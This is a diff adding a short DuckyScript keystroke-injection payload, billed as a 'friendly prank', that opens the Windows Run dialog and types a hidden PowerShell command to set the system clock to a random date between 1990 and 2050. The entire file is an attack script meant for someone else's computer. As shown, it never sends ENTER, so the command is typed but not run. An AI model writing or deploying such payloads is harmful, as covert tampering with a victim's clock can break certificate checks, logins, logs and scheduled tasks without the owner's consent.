@@ -1,0 +1,10 @@
+REM ============================================
+REM Random Time Prank
+REM FOR FRIENDLY PRANKS ONLY
+REM ============================================
+REM Sets system clock to a random year between 1990 and 2050
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "$r=New-Object System.Random;$y=$r.Next(1990,2050);$m=$r.Next(1,12);$d=$r.Next(1,28);$h=$r.Next(0,23);$n=$r.Next(0,59);$s=$r.Next(0,59);$date=Get-Date -Year $y -Month $m -Day $d -Hour $h -Minute $n -Second $s;Set-Date -Date $date;Write-Host ('Time set to: '+$date)"
